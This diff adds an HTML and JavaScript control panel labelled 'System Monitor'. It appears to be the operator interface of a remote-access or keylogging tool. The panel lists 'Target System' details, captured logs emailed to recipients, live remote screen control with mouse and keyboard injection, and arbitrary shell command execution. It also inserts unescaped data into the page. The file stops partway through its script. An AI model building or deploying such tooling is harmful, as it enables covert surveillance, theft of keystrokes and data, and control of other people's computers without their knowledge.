@@ -1,0 +1,1482 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>System Monitor Dashboard</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            background: #f4f6f9;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .sidebar {
+            position: fixed;
+            left: 0;
+            top: 0;
+            width: 220px;
+            height: 100vh;
+            background: #1a237e;
+            padding: 0;
+            overflow-y: auto;
+            z-index: 100;
+        }
+        
+        .sidebar-brand {
+            padding: 20px;
+            border-bottom: 1px solid rgba(255,255,255,0.1);
+            margin-bottom: 10px;
+        }
+        
+        .sidebar-brand h2 {
+            color: #fff;
+            font-size: 18px;
+            font-weight: 600;
+            margin: 0;
+        }
+        
+        .sidebar-brand span {
+            color: rgba(255,255,255,0.5);
+            font-size: 11px;
+            display: block;
+            margin-top: 2px;
+        }
+        
+        .nav-item {
+            padding: 12px 20px;
+            color: rgba(255,255,255,0.7);
+            cursor: pointer;
+            transition: all 0.2s;
+            text-decoration: none;
+            display: block;
+            font-size: 14px;
+            border-left: 3px solid transparent;
+        }
+        
+        .nav-item:hover {
+            background: rgba(255,255,255,0.05);
+            color: #fff;
+        }
+        
+        .nav-item.active {
+            background: rgba(255,255,255,0.1);
+            color: #fff;
+            border-left: 3px solid #fff;
+        }
+        
+        .nav-item .nav-logout {
+            margin-top: 30px;
+            color: rgba(255,255,255,0.5);
+        }
+        
+        .main-content {
+            margin-left: 220px;
+            padding: 20px;
+            min-height: 100vh;
+        }
+        
+        .header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+            padding-bottom: 15px;
+            border-bottom: 1px solid #e0e0e0;
+        }
+        
+        .header h1 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #1a237e;
+        }
+        
+        .btn {
+            padding: 8px 16px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            font-size: 13px;
+            font-weight: 500;
+            transition: all 0.2s;
+        }
+        
+        .btn-primary {
+            background: #1a237e;
+            color: white;
+        }
+        
+        .btn-primary:hover {
+            background: #0d47a1;
+        }
+        
+        .btn-secondary {
+            background: #e8eaf6;
+            color: #1a237e;
+        }
+        
+        .btn-secondary:hover {
+            background: #c5cae9;
+        }
+        
+        .btn-danger {
+            background: #c62828;
+            color: white;
+        }
+        
+        .btn-danger:hover {
+            background: #b71c1c;
+        }
+        
+        .card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            border: 1px solid #e0e0e0;
+        }
+        
+        .card h3 {
+            color: #1a237e;
+            margin-bottom: 15px;
+            padding-bottom: 10px;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 16px;
+            font-weight: 600;
+        }
+        
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
+            gap: 15px;
+            margin-bottom: 20px;
+        }
+        
+        .stat-card {
+            background: white;
+            border-radius: 8px;
+            padding: 20px;
+            text-align: center;
+            box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+            border: 1px solid #e0e0e0;
+        }
+        
+        .stat-card .number {
+            font-size: 28px;
+            color: #1a237e;
+            font-weight: 600;
+        }
+        
+        .stat-card .label {
+            color: #757575;
+            margin-top: 5px;
+            font-size: 13px;
+        }
+        
+        table {
+            width: 100%;
+            border-collapse: collapse;
+        }
+        
+        th, td {
+            padding: 10px 12px;
+            text-align: left;
+            border-bottom: 1px solid #e0e0e0;
+            font-size: 13px;
+        }
+        
+        th {
+            background: #f5f5f5;
+            color: #424242;
+            font-weight: 600;
+        }
+        
+        tr:hover {
+            background: #fafafa;
+        }
+        
+        .form-group {
+            margin-bottom: 15px;
+        }
+        
+        .form-group input, .form-group select {
+            width: 100%;
+            padding: 10px 12px;
+            border: 1px solid #ddd;
+            border-radius: 4px;
+            background: #f8f9fa;
+            color: #333;
+            font-size: 14px;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a237e;
+            background: white;
+        }
+        
+        .form-row {
+            display: flex;
+            gap: 10px;
+        }
+        
+        .form-row input, .form-row select {
+            flex: 1;
+        }
+        
+        .badge {
+            padding: 3px 8px;
+            border-radius: 3px;
+            font-size: 11px;
+            font-weight: 500;
+        }
+        
+        .badge-success {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+        
+        .badge-danger {
+            background: #ffebee;
+            color: #c62828;
+        }
+        
+        .section {
+            display: none;
+        }
+        
+        .section.active {
+            display: block;
+        }
+        
+        .log-preview {
+            background: #f5f5f5;
+            padding: 12px;
+            border-radius: 4px;
+            font-family: 'Courier New', monospace;
+            font-size: 12px;
+            max-height: 200px;
+            overflow-y: auto;
+            white-space: pre-wrap;
+            word-break: break-all;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0,0,0,0.5);
+            z-index: 1000;
+            align-items: center;
+            justify-content: center;
+        }
+        
+        .modal.active {
+            display: flex;
+        }
+        
+        .modal-content {
+            background: white;
+            border-radius: 8px;
+            padding: 25px;
+            max-width: 700px;
+            width: 92%;
+            max-height: 85vh;
+            overflow-y: auto;
+        }
+        
+        .close-modal {
+            float: right;
+            cursor: pointer;
+            font-size: 24px;
+            color: #999;
+            line-height: 1;
+        }
+        
+        .close-modal:hover {
+            color: #333;
+        }
+        
+        .system-info p {
+            margin-bottom: 10px;
+            color: #555;
+        }
+        
+        .system-info strong {
+            color: #1a237e;
+        }
+        
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+        }
+        
+        .info-item {
+            background: #f8f9fa;
+            padding: 12px;
+            border-radius: 4px;
+            border: 1px solid #e0e0e0;
+        }
+        
+        .info-item .label {
+            color: #757575;
+            font-size: 11px;
+            text-transform: uppercase;
+            margin-bottom: 4px;
+        }
+        
+        .info-item .value {
+            color: #1a237e;
+            font-weight: 500;
+            font-size: 15px;
+        }
+        
+        .screen-container {
+            display: flex;
+            gap: 15px;
+            flex-wrap: wrap;
+        }
+        
+        .screen-view {
+            flex: 1;
+            min-width: 0;
+        }
+        
+        .screen-controls {
+            flex: 0 0 220px;
+            max-width: 250px;
+        }
+        
+        #screenContainer {
+            position: relative;
+            width: 100%;
+            background: #000;
+            border-radius: 4px;
+            overflow: hidden;
+        }
+        
+        #remoteScreen {
+            width: 100%;
+            height: auto;
+            display: block;
+            cursor: crosshair;
+            touch-action: none;
+            user-select: none;
+        }
+        
+        #screenOverlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10;
+        }
+        
+        /* Fullscreen mode */
+        .fullscreen #screenContainer {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100vw;
+            height: 100vh;
+            z-index: 9999;
+            border-radius: 0;
+        }
+        
+        .fullscreen #remoteScreen {
+            width: 100vw;
+            height: 100vh;
+            object-fit: contain;
+            background: #000;
+        }
+        
+        .fullscreen .screen-controls {
+            position: fixed;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
+            z-index: 10000;
+            max-width: 200px;
+            background: rgba(26, 35, 126, 0.95);
+            backdrop-filter: blur(10px);
+        }
+        
+        .fullscreen .screen-controls .card {
+            background: white;
+        }
+        
+        /* Touch feedback */
+        .touch-indicator {
+            position: absolute;
+            width: 40px;
+            height: 40px;
+            border: 2px solid #1a237e;
+            border-radius: 50%;
+            transform: translate(-50%, -50%);
+            pointer-events: none;
+            z-index: 100;
+            animation: touchPulse 0.3s ease-out;
+        }
+        
+        @keyframes touchPulse {
+            0% { transform: translate(-50%, -50%) scale(0.5); opacity: 1; }
+            100% { transform: translate(-50%, -50%) scale(1.5); opacity: 0; }
+        }
+        
+        .quick-commands {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(140px, 1fr));
+            gap: 8px;
+            margin-top: 15px;
+        }
+        
+        .quick-cmd {
+            background: #f8f9fa;
+            border: 1px solid #e0e0e0;
+            padding: 8px;
+            text-align: center;
+            font-family: monospace;
+            font-size: 11px;
+            cursor: pointer;
+            border-radius: 3px;
+            transition: all 0.2s;
+            word-break: break-all;
+        }
+        
+        .quick-cmd:hover {
+            background: #e8eaf6;
+            border-color: #1a237e;
+        }
+        
+        .command-input {
+            margin-top: 15px;
+        }
+        
+        .command-input .form-row {
+            align-items: center;
+        }
+        
+        .command-input input {
+            font-family: monospace;
+        }
+        
+        @media (max-width: 768px) {
+            .sidebar {
+                width: 60px;
+            }
+            
+            .sidebar-brand h2 {
+                display: none;
+            }
+            
+            .nav-item {
+                padding: 12px 15px;
+                font-size: 12px;
+                text-align: center;
+            }
+            
+            .main-content {
+                margin-left: 60px;
+                padding: 15px;
+            }
+            
+            .screen-container {
+                flex-direction: column;
+            }
+            
+            .screen-controls {
+                flex: none;
+                max-width: 100%;
+                width: 100%;
+            }
+            
+            .stats-grid {
+                grid-template-columns: repeat(2, 1fr);
+            }
+            
+            .header {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 10px;
+            }
+            
+            /* Fullscreen on mobile shows controls at bottom */
+            .fullscreen .screen-controls {
+                position: fixed;
+                right: auto;
+                left: 0;
+                top: auto;
+                bottom: 0;
+                transform: none;
+                width: 100%;
+                max-width: 100%;
+                display: flex;
+                flex-direction: column;
+                gap: 10px;
+                padding: 10px;
+                background: transparent;
+            }
+            
+            .fullscreen .screen-controls .card {
+                background: rgba(26, 35, 126, 0.95);
+                color: white;
+                backdrop-filter: blur(10px);
+            }
+            
+            .fullscreen .screen-controls h3 {
+                color: white;
+                border-bottom-color: rgba(255,255,255,0.2);
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .sidebar {
+                width: 100%;
+                height: auto;
+                position: relative;
+            }
+            
+            .sidebar-brand {
+                text-align: center;
+            }
+            
+            .nav-item {
+                display: inline-block;
+                width: 48%;
+            }
+            
+            .main-content {
+                margin-left: 0;
+                padding: 10px;
+            }
+            
+            .stats-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <div class="sidebar">
+        <div class="sidebar-brand">
+            <h2>System Monitor</h2>
+            <span>v1.1.0</span>
+        </div>
+        <a class="nav-item active" onclick="showSection('dashboard')">Dashboard</a>
+        <a class="nav-item" onclick="showSection('recipients')">Recipients</a>
+        <a class="nav-item" onclick="showSection('logs')">Logs</a>
+        <a class="nav-item" onclick="showSection('screen')">Remote Screen</a>
+        <a class="nav-item" onclick="showSection('commands')">Commands</a>
+        <a class="nav-item" onclick="showSection('system')">System</a>
+        <a class="nav-item" onclick="showSection('settings')">Settings</a>
+        <a class="nav-item" href="/logout" style="margin-top: 30px;">Logout</a>
+    </div>
+    
+    <div class="main-content">
+        <!-- Dashboard Section -->
+        <div id="dashboard" class="section active">
+            <div class="header">
+                <h1>Dashboard Overview</h1>
+                <button class="btn btn-primary" onclick="captureLogs()">Capture Logs Now</button>
+            </div>
+            
+            <div class="stats-grid">
+                <div class="stat-card">
+                    <div class="number" id="recipientCount">0</div>
+                    <div class="label">Active Recipients</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="logCount">0</div>
+                    <div class="label">Total Logs</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="commandCount">0</div>
+                    <div class="label">Commands Executed</div>
+                </div>
+                <div class="stat-card">
+                    <div class="number" id="lastCapture">-</div>
+                    <div class="label">Last Capture</div>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>System Information</h3>
+                <div class="info-grid" id="systemInfo">
+                    <div class="info-item">
+                        <div class="label">Loading...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Recipients Section -->
+        <div id="recipients" class="section">
+            <div class="header">
+                <h1>Email Recipients</h1>
+            </div>
+            
+            <div class="card">
+                <h3>Add Recipient</h3>
+                <div class="form-row">
+                    <input type="email" id="newRecipientEmail" placeholder="Enter email address">
+                    <button class="btn btn-primary" onclick="addRecipient()">Add</button>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>Active Recipients</h3>
+                <table id="recipientsTable">
+                    <thead>
+                        <tr>
+                            <th>Email</th>
+                            <th>Status</th>
+                            <th>Added</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Logs Section -->
+        <div id="logs" class="section">
+            <div class="header">
+                <h1>Captured Logs</h1>
+                <button class="btn btn-primary" onclick="captureLogs()">Capture Now</button>
+            </div>
+            
+            <div class="card">
+                <div class="form-row" style="margin-bottom: 15px;">
+                    <select id="logFilter" onchange="filterLogs()">
+                        <option value="all">All Logs</option>
+                        <option value="sent">Sent</option>
+                        <option value="unsent">Unsent</option>
+                    </select>
+                    <button class="btn btn-secondary" onclick="refreshLogs()">Refresh</button>
+                </div>
+                <table id="logsTable">
+                    <thead>
+                        <tr>
+                            <th>ID</th>
+                            <th>Preview</th>
+                            <th>Captured</th>
+                            <th>Status</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- Remote Screen Section -->
+        <div id="screen" class="section">
+            <div class="header">
+                <h1>Remote Screen Control</h1>
+                <div>
+                    <button class="btn btn-primary" onclick="startScreenCapture()">Start Capture</button>
+                    <button class="btn btn-secondary" onclick="stopScreenCapture()">Stop</button>
+                    <button class="btn btn-secondary" onclick="toggleFullscreen()">Fullscreen</button>
+                </div>
+            </div>
+            
+            <div class="card" style="padding: 10px;">
+                <h3>Live Screen View - Tap to Click, Drag to Move Mouse</h3>
+                <div class="screen-container" style="gap: 10px;">
+                    <div class="screen-view" style="flex: 1; min-width: 0;">
+                        <div id="screenContainer" style="position: relative; width: 100%; background: #000; border-radius: 4px; overflow: hidden;">
+                            <img id="remoteScreen" src="" alt="Remote screen" 
+                                style="width: 100%; height: auto; display: block; cursor: crosshair; touch-action: none;">
+                            <div id="screenOverlay" style="position: absolute; top: 0; left: 0; width: 100%; height: 100%;"></div>
+                        </div>
+                    </div>
+                    <div class="screen-controls" style="flex: 0 0 200px;">
+                        <div class="card" style="margin-bottom: 15px; padding: 15px;">
+                            <h3 style="font-size: 14px;">Mouse Control</h3>
+                            <div class="quick-commands" style="grid-template-columns: 1fr 1fr;">
+                                <div class="quick-cmd" onclick="mouseClick('left')">Left</div>
+                                <div class="quick-cmd" onclick="mouseClick('right')">Right</div>
+                                <div class="quick-cmd" onclick="mouseClick('middle')">Middle</div>
+                                <div class="quick-cmd" onclick="mouseClick('double')">Double</div>
+                            </div>
+                        </div>
+                        
+                        <div class="card" style="margin-bottom: 15px; padding: 15px;">
+                            <h3 style="font-size: 14px;">Type Text</h3>
+                            <div class="form-group" style="margin-bottom: 10px;">
+                                <input type="text" id="typeText" placeholder="Enter text">
+                            </div>
+                            <button class="btn btn-secondary" style="width: 100%" onclick="sendText()">Send</button>
+                        </div>
+                        
+                        <div class="card" style="padding: 15px;">
+                            <h3 style="font-size: 14px;">Status</h3>
+                            <p id="screenStatus" style="color: #757575; font-size: 12px; margin-bottom: 5px;">Not connected</p>
+                            <p id="mousePos" style="color: #757575; font-size: 12px;">Mouse: -</p>
+                            <p id="screenSize" style="color: #757575; font-size: 12px;">Resolution: -</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            
+            <div class="card" style="margin-top: 15px;">
+                <h3>Screen Information</h3>
+                <div class="info-grid" id="screenInfo">
+                    <div class="info-item">
+                        <div class="label">Loading...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Commands Section -->
+        <div id="commands" class="section">
+            <div class="header">
+                <h1>Executed Commands</h1>
+            </div>
+            
+            <div class="card">
+                <h3>Quick Commands</h3>
+                <div class="quick-commands">
+                    <div class="quick-cmd" onclick="execCommand('whoami')">whoami</div>
+                    <div class="quick-cmd" onclick="execCommand('hostname')">hostname</div>
+                    <div class="quick-cmd" onclick="execCommand('pwd')">pwd</div>
+                    <div class="quick-cmd" onclick="execCommand('ls -la')">ls -la</div>
+                    <div class="quick-cmd" onclick="execCommand('df -h')">df -h</div>
+                    <div class="quick-cmd" onclick="execCommand('free -m')">free -m</div>
+                    <div class="quick-cmd" onclick="execCommand('ps aux')">ps aux</div>
+                    <div class="quick-cmd" onclick="execCommand('netstat -tuln')">netstat -tuln</div>
+                    <div class="quick-cmd" onclick="execCommand('uptime')">uptime</div>
+                    <div class="quick-cmd" onclick="execCommand('cat /etc/os-release')">cat os-release</div>
+                    <div class="quick-cmd" onclick="execCommand('uname -a')">uname -a</div>
+                    <div class="quick-cmd" onclick="execCommand('ifconfig')">ifconfig</div>
+                </div>
+                
+                <div class="command-input">
+                    <div class="form-row">
+                        <input type="text" id="customCommand" placeholder="Enter custom command" onkeypress="if(event.key==='Enter')execCustomCommand()">
+                        <button class="btn btn-primary" onclick="execCustomCommand()">Execute</button>
+                    </div>
+                </div>
+                <div id="commandOutput" class="log-preview" style="display: none; margin-top: 15px;"></div>
+            </div>
+            
+            <div class="card">
+                <h3>Command History</h3>
+                <table id="commandsTable">
+                    <thead>
+                        <tr>
+                            <th>Command</th>
+                            <th>Output Preview</th>
+                            <th>Executed</th>
+                            <th>Actions</th>
+                        </tr>
+                    </thead>
+                    <tbody></tbody>
+                </table>
+            </div>
+        </div>
+        
+        <!-- System Section -->
+        <div id="system" class="section">
+            <div class="header">
+                <h1>System Information</h1>
+            </div>
+            
+            <div class="card">
+                <h3>Target System Details</h3>
+                <div class="info-grid" id="detailedSystemInfo">
+                    <div class="info-item">
+                        <div class="label">Loading...</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+        
+        <!-- Settings Section -->
+        <div id="settings" class="section">
+            <div class="header">
+                <h1>Settings</h1>
+            </div>
+            
+            <div class="card">
+                <h3>Send Dashboard URL</h3>
+                <div class="form-group">
+                    <input type="text" id="dashboardUrl" placeholder="Enter dashboard URL">
+                </div>
+                <button class="btn btn-primary" onclick="sendDashboardUrl()">Send to All Recipients</button>
+            </div>
+            
+            <div class="card">
+                <h3>Test Email</h3>
+                <div class="form-row">
+                    <input type="email" id="testEmail" placeholder="Enter test email">
+                    <button class="btn btn-secondary" onclick="sendTestEmail()">Send Test</button>
+                </div>
+            </div>
+            
+            <div class="card">
+                <h3>Database Cleanup</h3>
+                <p style="color: #757575; margin-bottom: 15px;">Delete logs older than specified days</p>
+                <div class="form-row">
+                    <input type="number" id="cleanupDays" value="7" min="1" max="365" style="width: 100px;">
+                    <button class="btn btn-danger" onclick="cleanupLogs()">Cleanup Old Logs</button>
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Log Detail Modal -->
+    <div class="modal" id="logModal">
+        <div class="modal-content">
+            <span class="close-modal" onclick="closeModal()">&times;</span>
+            <h3 style="color: #1a237e; margin-bottom: 15px;">Log Details</h3>
+            <pre id="logDetail" class="log-preview" style="max-height: 500px;"></pre>
+        </div>
+    </div>
+    
+    <script>
+        // Navigation
+        function showSection(sectionId) {
+            document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
+            document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
+            document.getElementById(sectionId).classList.add('active');
+            if (event && event.target) {
+                event.target.classList.add('active');
+            }
+            
+            // Load data for section
+            if (sectionId === 'dashboard') loadDashboard();
+            if (sectionId === 'recipients') loadRecipients();
+            if (sectionId === 'logs') loadLogs();
+            if (sectionId === 'screen') loadScreenInfo();
+            if (sectionId === 'commands') loadCommands();
+            if (sectionId === 'system') loadSystemInfo();
+        }
+        
+        // Dashboard
+        async function loadDashboard() {
+            try {
+                const [recipientsRes, logsRes, commandsRes, systemRes] = await Promise.all([
+                    fetch('/api/recipients'),
+                    fetch('/api/logs?limit=1'),
+                    fetch('/api/commands'),
+                    fetch('/api/system')
+                ]);
+                
+                const recipients = await recipientsRes.json();
+                const logs = await logsRes.json();
+                const commands = await commandsRes.json();
+                const system = await systemRes.json();
+                
+                document.getElementById('recipientCount').textContent = recipients.filter(r => r.active).length;
+                document.getElementById('logCount').textContent = logs.length;
+                document.getElementById('commandCount').textContent = commands.length;
+                
+                if (logs.length > 0) {
+                    document.getElementById('lastCapture').textContent = new Date(logs[0].captured_at).toLocaleDateString();
+                }
+                
+                if (system.hostname) {
+                    document.getElementById('systemInfo').innerHTML = `
+                        <div class="info-item">
+                            <div class="label">Hostname</div>
+                            <div class="value">${system.hostname}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="label">Operating System</div>
+                            <div class="value">${system.os_info || 'Unknown'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="label">IP Address</div>
+                            <div class="value">${system.ip_address || 'Unknown'}</div>
+                        </div>
+                        <div class="info-item">
+                            <div class="label">Username</div>
+                            <div class="value">${system.username || 'Unknown'}</div>
+                        </div>
+                    `;
+                }
+            } catch (error) {
+                console.error('Error loading dashboard:', error);
+            }
+        }
+        
+        // Recipients
+        async function loadRecipients() {
+            try {
+                const response = await fetch('/api/recipients');
+                const recipients = await response.json();
+                
+                const tbody = document.querySelector('#recipientsTable tbody');
+                tbody.innerHTML = recipients.map(r => `
+                    <tr>
+                        <td>${r.email}</td>
+                        <td><span class="badge ${r.active ? 'badge-success' : 'badge-danger'}">${r.active ? 'Active' : 'Inactive'}</span></td>
+                        <td>${new Date(r.added_at).toLocaleString()}</td>
+                        <td>
+                            <button class="btn btn-secondary" onclick="toggleRecipient(${r.id}, ${!r.active})">
+                                ${r.active ? 'Deactivate' : 'Activate'}
+                            </button>
+                            <button class="btn btn-danger" onclick="deleteRecipient(${r.id})">Delete</button>
+                        </td>
+                    </tr>
+                `).join('');
+            } catch (error) {
+                console.error('Error loading recipients:', error);
+            }
+        }
+        
+        async function addRecipient() {
+            const email = document.getElementById('newRecipientEmail').value;
+            if (!email) return;
+            
+            try {
+                const response = await fetch('/api/recipients', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ email })
+                });
+                
+                const data = await response.json();
+                if (data.success) {
+                    document.getElementById('newRecipientEmail').value = '';
+                    loadRecipients();
+                }
+            } catch (error) {
+                console.error('Error adding recipient:', error);
+            }
+        }
+        
+        async function toggleRecipient(id, active) {
+            try {
+                await fetch(`/api/recipients/${id}`, {
+                    method: 'PUT',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ active })
+                });
+                loadRecipients();
+            } catch (error) {
+                console.error('Error toggling recipient:', error);
+            }
+        }
+        
+        async function deleteRecipient(id) {
+            if (!confirm('Delete this recipient?')) return;
+            
+            try {
+                await fetch(`/api/recipients/${id}`, { method: 'DELETE' });
+                loadRecipients();
+            } catch (error) {
+                console.error('Error deleting recipient:', error);
+            }
+        }
+        
+        // Logs
+        async function loadLogs() {
+            try {
+                const response = await fetch('/api/logs');
+                const logs = await response.json();
+                
+                const tbody = document.querySelector('#logsTable tbody');
+                tbody.innerHTML = logs.map(l => `
+                    <tr>
+                        <td>${l.id}</td>
+                        <td style="max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">
+                            ${l.preview || 'No data'}
+                        </td>
+                        <td>${new Date(l.captured_at).toLocaleString()}</td>
+                        <td><span class="badge ${l.sent ? 'badge-success' : 'badge-danger'}">${l.sent ? 'Sent' : 'Unsent'}</span></td>
+                        <td><button class="btn btn-secondary" onclick="viewLog(${l.id})">View</button></td>
+                    </tr>
+                `).join('');
+            } catch (error) {
+                console.error('Error loading logs:', error);
+            }
+        }
+        
+        async function viewLog(id) {
+            try {
+                const response = await fetch(`/api/logs/${id}`);
+                const log = await response.json();
+                
+                document.getElementById('logDetail').textContent = log.log_data;
+                document.getElementById('logModal').classList.add('active');
+            } catch (error) {
+                console.error('Error viewing log:', error);
+            }
+        }
+        
+        async function captureLogs() {
+            try {
+                const response = await fetch('/api/logs/capture', { method: 'POST' });
+                const data = await response.json();
+                alert(data.message || 'Logs captured');
+                loadLogs();
+                loadDashboard();
+            } catch (error) {
+                console.error('Error capturing logs:', error);
+            }
+        }
+        
+        function filterLogs() {
+            const filter = document.getElementById('logFilter').value;
+            const rows = document.querySelectorAll('#logsTable tbody tr');
+            
+            rows.forEach(row => {
+                const badge = row.querySelector('.badge');
+                if (badge) {
+                    const status = badge.textContent.toLowerCase();
+                    if (filter === 'all' || 
+                        (filter === 'sent' && status === 'sent') || 
+                        (filter === 'unsent' && status === 'unsent')) {
+                        row.style.display = '';
+                    } else {
+                        row.style.display = 'none';
+                    }
+                }
+            });
+        }
+        
+        function refreshLogs() {
+            loadLogs();
+        }
+        
+        // Remote Screen
+        let socket = null;
+        let screenWidth = 1920;
+        let screenHeight = 1080;
+        let isDragging = false;
+        let lastMousePos = { x: 0, y: 0 };
+        
+        function initSocketIO() {
+            if (!socket) {
+                socket = io({ reconnection: true, timeout: 10000 });
+                
+                socket.on('connect', () => {
+                    document.getElementById('screenStatus').textContent = 'Connected';
+                    document.getElementById('screenStatus').style.color = '#2e7d32';
+                });
+                
+                socket.on('disconnect', () => {
+                    document.getElementById('screenStatus').textContent = 'Disconnected';
+                    document.getElementById('screenStatus').style.color = '#c62828';
+                });
+                
+                socket.on('connect_error', (err) => {
+                    console.error('Socket connect error:', err);
+                    document.getElementById('screenStatus').textContent = 'Connection error';
+                });
+                
+                socket.on('screen_update', (data) => {
+                    const img = document.getElementById('remoteScreen');
+                    img.src = 'data:image/jpeg;base64,' + data.image;
+                    
+                    // Update screen size from server
+                    if (data.size) {
+                        screenWidth = data.size.width || 1920;
+                        screenHeight = data.size.height || 1080;
+                        document.getElementById('screenSize').textContent = `Resolution: ${screenWidth} x ${screenHeight}`;
+                    }
+                });
+                
+                socket.on('mouse_position', (data) => {
+                    document.getElementById('mousePos').textContent = `Mouse: (${data.x}, ${data.y})`;
+                });
+            }
+        }
+        
+        function startScreenCapture() {
+            initSocketIO();
+            socket.emit('start_screen');
+            document.getElementById('screenStatus').textContent = 'Starting...';
+            loadScreenInfo();
+        }
+        
+        function stopScreenCapture() {
+            if (socket) {
+                socket.emit('stop_screen');
+                document.getElementById('screenStatus').textContent = 'Stopped';
+            }
+        }
+        
+        function toggleFullscreen() {
+            document.body.classList.toggle('fullscreen');
+        }
+        
+        function mouseClick(button, x = null, y = null) {
+            initSocketIO();
+            socket.emit('click_mouse', { button: button, x: x, y: y });
+            
+            // Show visual feedback
+            if (x !== null && y !== null) {
+                showTouchIndicator(x, y);
+            }
+        }
+        
+        function sendText() {
+            initSocketIO();
+            const text = document.getElementById('typeText').value;
+            if (text) {
+                socket.emit('type_text', { text: text });
+                document.getElementById('typeText').value = '';
+            }
+        }
+        
+        // Touch/Mouse interaction on screen
+        function setupScreenInteraction() {
+            const screen = document.getElementById('remoteScreen');
+            const overlay = document.getElementById('screenOverlay');
+            
+            // Get screen dimensions
+            function getScreenRect() {
+                const rect = screen.getBoundingClientRect();
+                return {
+                    width: rect.width,
+                    height: rect.height,
+                    left: rect.left,
+                    top: rect.top
+                };
+            }
+            
+            // Convert screen coordinates to remote coordinates
+            function toRemoteCoords(clientX, clientY) {
+                const rect = getScreenRect();
+                const x = ((clientX - rect.left) / rect.width) * screenWidth;
+                const y = ((clientY - rect.top) / rect.height) * screenHeight;
+                return { x: Math.round(x), y: Math.round(y) };
+            }
+            
+            // Mouse down / Touch start
+            function handleStart(e) {
+                isDragging = true;
+                e.preventDefault();
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+                const coords = toRemoteCoords(clientX, clientY);
+                lastMousePos = coords;
+                
+                // Move mouse to position
+                initSocketIO();
+                socket.emit('move_mouse', coords);
+                
+                // Show indicator
+                showTouchIndicator(clientX, clientY);
+            }
+            
+            // Mouse move / Touch move
+            function handleMove(e) {
+                if (!isDragging) return;
+                e.preventDefault();
+                const clientX = e.touches ? e.touches[0].clientX : e.clientX;
+                const clientY = e.touches ? e.touches[0].clientY : e.clientY;
+                const coords = toRemoteCoords(clientX, clientY);
+                
+                // Only send if position changed significantly
+                if (Math.abs(coords.x - lastMousePos.x) > 5 || Math.abs(coords.y - lastMousePos.y) > 5) {
+                    lastMousePos = coords;
+                    initSocketIO();
+                    socket.emit('move_mouse', coords);
+                }
+            }
+            
+            // Mouse up / Touch end
+            function handleEnd(e) {
+                if (!isDragging) return;
+                isDragging = false;
+                
+                // Click at last position
+                initSocketIO();
+                socket.emit('click_mouse', { button: 'left', x: lastMousePos.x, y: lastMousePos.y });
+            }
+            
+            // Mouse click (without drag)
+            function handleClick(e) {
+                if (isDragging) return; // Already handled by handleEnd
+                const coords = toRemoteCoords(e.clientX, e.clientY);
+                initSocketIO();
+                socket.emit('click_mouse', { button: 'left', x: coords.x, y: coords.y });
+                showTouchIndicator(e.clientX, e.clientY);
+            }
+            
+            // Right click
+            function handleContextMenu(e) {
+                e.preventDefault();
+                const coords = toRemoteCoords(e.clientX, e.clientY);
+                initSocketIO();
+                socket.emit('click_mouse', { button: 'right', x: coords.x, y: coords.y });
+            }
+            
+            // Attach event listeners
+            overlay.addEventListener('mousedown', handleStart);
+            overlay.addEventListener('mousemove', handleMove);
+            overlay.addEventListener('mouseup', handleEnd);
+            overlay.addEventListener('mouseleave', handleEnd);
+            overlay.addEventListener('click', handleClick);
+            overlay.addEventListener('contextmenu', handleContextMenu);
+            
+            // Touch events
